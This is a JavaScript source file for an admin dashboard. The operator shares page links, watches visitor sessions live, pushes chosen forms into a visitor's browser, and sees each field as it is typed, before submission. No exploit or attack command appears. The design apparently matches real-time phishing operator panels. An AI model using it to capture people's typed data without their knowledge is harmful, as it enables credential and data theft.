const socket = io();

const state = {
  pages: [],
  sessions: [],
  formTemplates: {},
  selectedPageId: null,
  selectedSessionId: null,
  // sessionId -> { formId, formType, label, fields, status, values }
  liveForms: new Map(),
  // mobile drill-down view: 'pages' | 'sessions' | 'detail' (ignored on wide screens)
  mobileView: 'pages'
};

const el = {
  connStatus: document.getElementById('connStatus'),
  createPageForm: document.getElementById('createPageForm'),
  newPageTitle: document.getElementById('newPageTitle'),
  pagesList: document.getElementById('pagesList'),
  sessionsList: document.getElementById('sessionsList'),
  sessionsHeading: document.getElementById('sessionsHeading'),
  detailPanel: document.getElementById('detailPanel'),
  layout: document.getElementById('layout'),
  mobileBackBtn: document.getElementById('mobileBackBtn')
};

// ---------- mobile drill-down navigation ----------
function setMobileView(view) {
  state.mobileView = view;
  el.layout.dataset.active = view;
  el.mobileBackBtn.classList.toggle('show', view !== 'pages');
}

el.mobileBackBtn.addEventListener('click', () => {
  if (state.mobileView === 'detail') setMobileView('sessions');
  else if (state.mobileView === 'sessions') setMobileView('pages');
});

// ---------- helpers ----------
function fmtTime(iso) {
  if (!iso) return '';
  const d = new Date(iso);
  return d.toLocaleString();
}

function pageTitleById(pageId) {
  const p = state.pages.find((pg) => pg.id === pageId);
  return p ? p.title : pageId;
}

async function api(path, options) {
  const res = await fetch(path, options);
  if (!res.ok) throw new Error(`Request failed: ${res.status}`);
  return res.json();
}

// ---------- data loading ----------
async function loadPages() {
  state.pages = await api('/api/pages');
  renderPages();
}

// ---------- rendering ----------
function renderPages() {
  el.pagesList.innerHTML = '';
  const allItem = document.createElement('li');
  allItem.className = 'page-item' + (state.selectedPageId === null ? ' active' : '');
  allItem.innerHTML = `<div class="title">All Pages</div>`;
  allItem.onclick = () => {
    state.selectedPageId = null;
    renderPages();
    renderSessions();
    setMobileView('sessions');
  };
  el.pagesList.appendChild(allItem);

  for (const page of state.pages) {
    const li = document.createElement('li');
    li.className = 'page-item' + (state.selectedPageId === page.id ? ' active' : '');
    li.innerHTML = `
      <div class="title">${escapeHtml(page.title)}</div>
      <span class="url">${escapeHtml(page.url)}</span>
      <button class="copy-btn" type="button">Copy link</button>
      <button class="delete-btn" type="button" aria-label="Delete page" title="Delete page">
        <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2m3 0-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6m5 5v6m4-6v6"/>
        </svg>
      </button>
    `;
    li.querySelector('.title').onclick = () => {
      state.selectedPageId = page.id;
      renderPages();
      renderSessions();
      setMobileView('sessions');
    };
    li.querySelector('.copy-btn').onclick = (e) => {
      e.stopPropagation();
      const btn = e.currentTarget;
      navigator.clipboard.writeText(page.url).then(() => {
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        clearTimeout(btn._copyTimer);
        btn._copyTimer = setTimeout(() => {
          btn.textContent = 'Copy link';
          btn.classList.remove('copied');
        }, 1500);
      }).catch(() => {
        btn.textContent = 'Copy failed';
        clearTimeout(btn._copyTimer);
        btn._copyTimer = setTimeout(() => { btn.textContent = 'Copy link'; }, 1500);
      });
    };
    li.querySelector('.delete-btn').onclick = (e) => {
      e.stopPropagation();
      showDeleteConfirm(li, page);
    };
    el.pagesList.appendChild(li);
  }
}

// Small inline confirm popover anchored to a page item
function closeDeleteConfirm() {
  const existing = document.querySelector('.confirm-pop');
  if (existing) existing.remove();
}

function showDeleteConfirm(li, page) {
  closeDeleteConfirm();
  const pop = document.createElement('div');
  pop.className = 'confirm-pop';
  pop.innerHTML = `
    <div class="confirm-text">Delete <strong>${escapeHtml(page.title)}</strong>?</div>
    <div class="confirm-sub">All its sessions and form data will be removed.</div>
    <div class="confirm-actions">
      <button type="button" class="cancel">Cancel</button>
      <button type="button" class="confirm">Delete</button>
    </div>
  `;
  pop.onclick = (e) => e.stopPropagation();
  pop.querySelector('.cancel').onclick = closeDeleteConfirm;
  pop.querySelector('.confirm').onclick = async (e) => {
    e.target.disabled = true;
    e.target.textContent = 'Deleting…';
    try {
      await api(`/api/pages/${encodeURIComponent(page.id)}`, { method: 'DELETE' });
      removePageLocally(page.id);
    } catch (err) {
      e.target.disabled = false;
      e.target.textContent = 'Delete';
      pop.querySelector('.confirm-sub').textContent = 'Failed to delete. Try again.';
    }
  };
  li.appendChild(pop);
  pop.querySelector('.cancel').focus();
}

document.addEventListener('click', closeDeleteConfirm);
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeDeleteConfirm();
});

function removePageLocally(pageId) {
  const removedSessionIds = new Set(
    state.sessions.filter((s) => s.page_id === pageId).map((s) => s.id)
  );
  state.pages = state.pages.filter((p) => p.id !== pageId);
  state.sessions = state.sessions.filter((s) => s.page_id !== pageId);
  for (const id of removedSessionIds) state.liveForms.delete(id);

  if (state.selectedPageId === pageId) state.selectedPageId = null;
  if (removedSessionIds.has(state.selectedSessionId)) {
    state.selectedSessionId = null;
    if (state.mobileView !== 'pages') setMobileView('pages');
  }

  renderPages();
  renderSessions();
  renderDetail();
}

function renderSessions() {
  const filtered = state.selectedPageId
    ? state.sessions.filter((s) => s.page_id === state.selectedPageId)
    : state.sessions;

  el.sessionsHeading.textContent = state.selectedPageId
    ? `Sessions · ${pageTitleById(state.selectedPageId)}`
    : 'All Sessions';

  el.sessionsList.innerHTML = '';
  if (filtered.length === 0) {
    const empty = document.createElement('li');
    empty.className = 'meta';
    empty.style.padding = '10px';
    empty.textContent = 'No sessions yet. Share a page link to see sessions appear live.';
    el.sessionsList.appendChild(empty);
    return;
  }

  for (const session of filtered) {
    const li = document.createElement('li');
    li.className = 'session-item' + (state.selectedSessionId === session.id ? ' selected' : '');
    li.innerHTML = `
      <div class="row">
        <span class="page-tag">${escapeHtml(pageTitleById(session.page_id))}</span>
        <span class="badge ${session.status}">${session.status}</span>
      </div>
      <div class="meta">Session ${session.id.slice(0, 8)}…</div>
      <div class="meta">${fmtTime(session.created_at)}</div>
    `;
    li.onclick = () => selectSession(session.id);
    el.sessionsList.appendChild(li);
  }
}

function renderDetail() {
  const session = state.sessions.find((s) => s.id === state.selectedSessionId);
  if (!session) {
    el.detailPanel.innerHTML = `<div class="empty-state">Select a session to view details</div>`;
    return;
  }

  const live = state.liveForms.get(session.id);
  const formOptions = Object.entries(state.formTemplates)
    .map(([key, tpl]) => `<option value="${key}">${escapeHtml(tpl.label)}</option>`)
    .join('');

  const hasOpenForm = live && live.status === 'open';

  el.detailPanel.innerHTML = `
    <div class="detail-header">
      <h2>${escapeHtml(pageTitleById(session.page_id))}</h2>
      <div class="sub">Session ${session.id} · ${session.status} · ${escapeHtml(session.user_agent || '')}</div>
    </div>

    <div class="form-actions">
      <select id="formTypeSelect">${formOptions}</select>
      <button id="openFormBtn" class="primary" ${hasOpenForm ? 'disabled' : ''}>Open Form</button>
      <button id="closeFormBtn" class="danger" ${hasOpenForm ? '' : 'disabled'}>Close Form</button>
    </div>

    <div id="liveFormContainer"></div>
  `;

  document.getElementById('openFormBtn').onclick = () => {
    const formType = document.getElementById('formTypeSelect').value;
    socket.emit('admin:openForm', { sessionId: session.id, formType }, (resp) => {
      if (resp && resp.error) alert(resp.error);
    });
  };
  document.getElementById('closeFormBtn').onclick = () => {
    if (!live) return;
    socket.emit('admin:closeForm', { sessionId: session.id, formId: live.formId });
  };

  renderLiveForm(session.id);
}

function renderLiveForm(sessionId) {
  const container = document.getElementById('liveFormContainer');
  if (!container) return;

  const live = state.liveForms.get(sessionId);
  if (!live) {
    container.innerHTML = '';
    return;
  }

  const fieldsHtml = live.fields
    .map((f) => {
      const value = live.values[f.name] || '';
      return `
        <p class="field-row">
          <span class="field-label">${escapeHtml(f.label)}${f.required ? ' *' : ''}:</span>
          <span class="field-text">${value ? escapeHtml(value) : '<span class="field-empty">—</span>'}</span>
        </p>
      `;
    })
    .join('');

  container.innerHTML = `
    <div class="live-form">
      <div class="form-title">
        <h3>${escapeHtml(live.label)}</h3>
        <span class="status-tag ${live.status}">${live.status}</span>
      </div>
      ${fieldsHtml}
    </div>
  `;
}

function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  })[c]);
}

// ---------- actions ----------
function selectSession(sessionId) {
  state.selectedSessionId = sessionId;
  renderSessions();
  renderDetail();
  setMobileView('detail');
}

el.createPageForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const title = el.newPageTitle.value.trim();
  if (!title) return;
  try {
    const page = await api('/api/pages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title })
    });
    el.newPageTitle.value = '';
    await loadPages();
    state.selectedPageId = page.id;
    renderPages();
    renderSessions();
  } catch (err) {
    alert('Failed to create page');
  }
});

// ---------- socket wiring ----------
socket.on('connect', () => {
  el.connStatus.textContent = 'online';
  el.connStatus.className = 'status-pill online';

  socket.emit('admin:register', {}, (resp) => {
    if (!resp) return;
    state.formTemplates = resp.formTemplates || {};
    state.sessions = (resp.sessions || []).map((s) => ({ ...s }));
    renderSessions();
    if (state.selectedSessionId) renderDetail();
  });
});

socket.on('disconnect', () => {
  el.connStatus.textContent = 'offline';
  el.connStatus.className = 'status-pill offline';
});

socket.on('session:new', ({ session }) => {
  state.sessions.unshift(session);
  renderSessions();
});

socket.on('page:deleted', ({ pageId }) => {
  if (state.pages.some((p) => p.id === pageId)) removePageLocally(pageId);
});

socket.on('session:online', ({ sessionId, session }) => {
  const existing = state.sessions.find((s) => s.id === sessionId);
  if (existing) {
    existing.status = 'active';
  } else if (session) {
    state.sessions.unshift(session);
  }
  renderSessions();
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('session:offline', ({ sessionId }) => {
  const session = state.sessions.find((s) => s.id === sessionId);
  if (session) session.status = 'inactive';
  renderSessions();
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:opened', ({ sessionId, formId, formType, label, fields }) => {
  state.liveForms.set(sessionId, { formId, formType, label, fields, status: 'open', values: {} });
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:inputUpdate', ({ sessionId, formId, field, value }) => {
  const live = state.liveForms.get(sessionId);
  if (!live || live.formId !== formId) return;
  live.values[field] = value;
  if (state.selectedSessionId === sessionId) renderLiveForm(sessionId);
});

socket.on('form:submitted', ({ sessionId, formId, data }) => {
  const live = state.liveForms.get(sessionId);
  if (!live || live.formId !== formId) return;
  live.status = 'submitted';
  live.values = { ...live.values, ...data };
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:closed', ({ sessionId, formId }) => {
  const live = state.liveForms.get(sessionId);
  if (!live || live.formId !== formId) return;
  live.status = 'closed';
  if (state.selectedSessionId === sessionId) renderDetail();
});

// ---------- init ----------
loadPages();
renderSessions();
renderDetail();
